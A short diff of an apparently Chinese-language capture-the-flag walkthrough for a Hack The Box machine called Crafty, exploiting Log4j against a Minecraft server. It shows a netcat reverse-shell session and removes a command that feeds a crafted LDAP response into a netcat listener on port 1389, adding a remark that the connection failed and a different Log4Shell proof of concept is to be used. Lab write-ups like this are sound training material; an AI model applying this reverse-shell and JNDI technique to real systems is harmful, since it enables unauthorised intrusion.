@@ -148,10 +148,7 @@ connect to [10.10.14.93] from crafty.htb [10.129.230.193] 49686
 whoami
  sent 7, rcvd 0
 ```
-#### 在发送包含有效负载的消息后，我们检查Netcat侦听器并看到我们在系统上创建一个名为svc_minecraft的shell。
-```
-$ echo -e '0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00' | sudo nc -nvv -l -p 1389 | xxd
-```
+#### 反弹连接不成功，这是官方文档使用的RogueJndi-1.1.jar，下面换成log4j-shell-poc
 -------------------------
 #### 我的世界https://github.com/MCCTeam/Minecraft-Console-Client
 #### Java SE 8 Archive Downloads (JDK 8u202 and earlier)：
